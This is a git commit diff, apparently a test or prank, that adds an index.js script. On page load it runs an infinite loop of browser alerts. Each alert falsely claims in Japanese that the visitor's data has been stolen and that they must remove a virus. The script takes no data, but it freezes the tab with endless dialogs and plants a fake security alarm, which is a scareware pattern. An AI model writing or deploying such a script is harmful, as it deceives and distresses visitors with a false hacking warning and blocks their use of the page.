9d9747dd2fac4ec3be54f3bca11b7447f0dbc176
sekihoutai <yokunsyoushie@gmail.com>
2023-02-09 23:49:08 +0900

    tessssssssssssssssss

---
+++ index.js
@@ -0,0 +1,12 @@
+window.onload = function () {
+	window.setTimeout(myalert(), 1000);
+	// while (true) {
+	// 	window.alert("データが抜き取られました。ウイルスを削除してください。");
+	// }
+}
+
+function myalert() {
+	while (true) {
+		window.alert("データが抜き取られました。ウイルスを削除してください。");
+	}
+}
